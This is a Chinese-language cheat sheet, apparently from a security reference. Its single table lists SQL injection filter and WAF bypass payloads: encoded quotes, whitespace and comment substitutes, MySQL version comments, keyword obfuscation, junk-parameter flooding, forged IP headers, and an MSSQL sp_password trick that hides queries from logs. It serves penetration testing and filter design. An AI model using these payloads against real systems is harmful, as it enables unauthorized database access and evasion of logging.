SQL 注入中字符过滤绕过技巧。

| 原始字符/语句                     | 绕过写法                                                      | 适用场景                                |
| --------------------------- | --------------------------------------------------------- | ----------------------------------- |
| `1 UNION`                   | `1e0UNION`                                                | MySQL, MSSQL                        |
| `1 UNION`                   | `1DUNION`                                                 | Oracle                              |
| `1 UNION`                   | `1-.1UNION`                                               | MySQL                               |
| `'`                         | `%EF%BC%87`                                               | 通用                                  |
| `'`                         | `%00%27`                                                  | 通用                                  |
| `'`                         | `%BF%27` (宽字节)                                            | MySQL GBK 编码                        |
| `'`                         | `\'`                                                      | 通用                                  |
| 空格                          | `/**/`                                                    | 通用                                  |
| 空格                          | `+`                                                       | 通用                                  |
| 空格                          | `--随机字符串%0A`                                              | MSSQL, SQLite                       |
| 空格                          | `--%0A`                                                   | MySQL, MSSQL                        |
| 空格                          | `#随机字符串%0A`                                               | MySQL 4.0/5.0                       |
| 空格                          | `%23%0A`                                                  | MSSQL, MySQL                        |
| 空格                          | `/**_**/`                                                 | MySQL 5.0/5.5                       |
| 空格                          | `%09` (TAB)                                               | MySQL                               |
| 空格                          | 随机 TAB/LF/FF/CR                                           | 通用                                  |
| 空格                          | ASCII 控制字符 (SOH/STX 等)                                    | MSSQL 2000/2005                     |
| 空格                          | 随机 TAB/LF/FF/CR/ `%A0`                                    | MySQL 5.1                           |
| 空格                          | 多个随机空格                                                    | 通用                                  |
| `>`                         | `NOT BETWEEN 0 AND`                                       | 通用                                  |
| `>`                         | `GREATEST(A,B+1)=A`                                       | MySQL, Oracle 10 g, PostgreSQL 8.3+ |
| `>`                         | `LEAST(A,B+1)=B+1`                                        | MySQL, Oracle 10 g, PostgreSQL 8.3+ |
| `=`                         | `LIKE`                                                    | 通用                                  |
| `=`                         | `RLIKE`                                                   | MySQL 4/5.0/5.5                     |
| `=`                         | `BETWEEN x AND x`                                         | 通用                                  |
| `AND`                       | `%26%26` (&&)                                             | 通用                                  |
| `OR`                        | `%7C%7C` (\|\|)                                           | 通用                                  |
| `UNION ALL SELECT`          | `UNION SELECT`                                            | 通用                                  |
| `CONCAT(A,B)`               | `CONCAT_WS(MID(CHAR(0),0,0),A,B)`                         | MySQL                               |
| `+` (拼接)                    | `CONCAT()`                                                | MSSQL 2012+                         |
| `+` (拼接)                    | `{fn CONCAT()}`                                           | MSSQL 2008+                         |
| `IF(A,B,C)`                 | `CASE WHEN(A) THEN(B) ELSE(C) END`                        | MySQL 5.0/5.5, SQLite               |
| `IFNULL(A,B)`               | `IF(ISNULL(A),B,A)`                                       | MySQL 5.0/5.5, SQLite               |
| `IFNULL(A,B)`               | `CASE WHEN ISNULL(A) THEN(B) ELSE(A) END`                 | MySQL 5.0/5.5, SQLite               |
| `ORD()`                     | `ASCII()`                                                 | MySQL                               |
| `SLEEP(5)`                  | `GET_LOCK('name',5)`                                      | MySQL 5.0+                          |
| `SUBSTRING(x FROM y FOR 1)` | `LEFT(RIGHT(x,...),1)`                                    | PostgreSQL 9.6                      |
| `LIMIT M,N`                 | `LIMIT N OFFSET M`                                        | MySQL                               |
| `MID(A,B,C)`                | `MID(A FROM B FOR C)`                                     | MySQL                               |
| `0x<hex>`                   | `CONCAT(CHAR(),...)`                                      | MySQL 4/5.0/5.5                     |
| `information_schema.`       | `information_schema/**/.`                                 | MySQL                               |
| `schema.table`              | `schema 9.e.table`                                        | MySQL                               |
| `函数名(`                      | `函数名/**/(`                                                | 通用                                  |
| SQL 关键词                     | 随机大小写 `SeLeCt`                                            | 通用                                  |
| SQL 关键词                     | 全部大写                                                      | 通用                                  |
| SQL 关键词                     | 全部小写                                                      | 通用                                  |
| SQL 关键词内部                   | 插入 `/**/` → `I/**/NS/**/ERT`                              | MySQL, MSSQL                        |
| SQL 关键词                     | `/*!关键词*/` (版本注释)                                         | MySQL 4.0/5.1/5.5                   |
| SQL 所有关键词                   | `/*!关键词*/` (含函数)                                          | MySQL ≥5.1.13                       |
| SQL 关键词前                    | `/*!0` (半版本注释)                                            | MySQL <5.1                          |
| 查询体                         | `/*!30xxx 查询体 */`                                         | MySQL 5.0+ (ModSecurity)            |
| 查询体                         | `/*!00000 查询体 */`                                         | MySQL 5.0+ (ModSecurity)            |
| 括号/运算符前                     | 插入 `1.e`                                                  | MySQL (AWS WAF)                     |
| 所有字符                        | URL 编码 `%53`                                              | 通用                                  |
| 所有字符                        | 双重 URL 编码 `%2553`                                         | 通用                                  |
| 所有字符                        | Unicode 编码 `%u0053`                                       | ASP/IIS                             |
| 所有字符                        | Unicode 转义 `\u0053`                                       | 通用 (JSON 请求体)                       |
| 所有字符                        | HTML 十进制实体 `&#39;`                                        | 通用 (需后端解码)                          |
| 所有字符                        | HTML 十六进制实体 `&#x27;`                                      | 通用 (需后端解码)                          |
| 所有字符                        | overlong UTF-8 `%C0%A0`                                   | 通用                                  |
| 每个字符前                       | 加 `%` → `%S%E%L%E%C%T`                                    | 仅 ASP/IIS                           |
| 整个 payload                  | Base 64 编码                                                | 通用 (需后端解码)                          |
| payload 末尾                  | 追加 `%00`                                                  | Microsoft Access                    |
| payload 末尾                  | 追加 `sp_password`                                          | MSSQL (隐藏日志)                        |
| 请求参数                        | 预置 500 个垃圾参数                                              | Lua-Nginx WAF                       |
| 请求参数                        | 预置~420 万个垃圾参数                                             | Lua-Nginx WAF (POST)                |
| HTTP 头                      | 伪造 X-Forwarded-For 等 IP 头                                 | 通用 (绕过 IP 封锁)                       |
| HTTP 头                      | `X-originating-IP: 127.0.0.1`                             | Varnish 反向代理                        |
| 数值/NULL 前                   | 加 `binary` 关键字                                            | MySQL                               |
| 查询结果含数字 `0-9`               | `replace(...to_base64(字段)...,"1","@A")...,"0","@J")` 链式替换 | MySQL ≥5.6（数字被过滤，输出侧编码绕过）           |
